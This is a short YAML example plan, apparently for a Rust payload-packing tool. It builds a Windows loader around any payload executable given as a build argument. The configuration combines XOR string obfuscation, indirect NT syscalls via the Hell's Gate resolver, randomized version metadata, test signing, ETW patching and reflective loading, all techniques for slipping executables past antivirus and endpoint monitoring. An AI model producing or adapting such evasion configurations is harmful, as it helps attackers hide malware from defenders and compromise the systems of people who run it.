# Reflective loading driven entirely by a build argument: the payload path is a
# `$arg.0$` token, so the plan is reusable without editing.
#
#   cargo run -- build examples/plans/usable.yaml .\some\payload.exe
#
# `build.stub.strings` obfuscates every stub literal, `syscalls: indirect`
# resolves the NTs at runtime, and the artifact is lab-signed with generated
# metadata.

schema: 6
name: usable-example

build:
  payloads:
    payload:
      source: "$arg.0$"

  stub:
    syscalls:
      mode: indirect
      resolver: hells_gate
    strings:
      strategy: xor

  output:
    path: out.exe
    resources:
      version_info:
        randomize: true
    sign:
      mode: lab

runtime:
  - technique: patch_etw
  - technique: reflective_loading
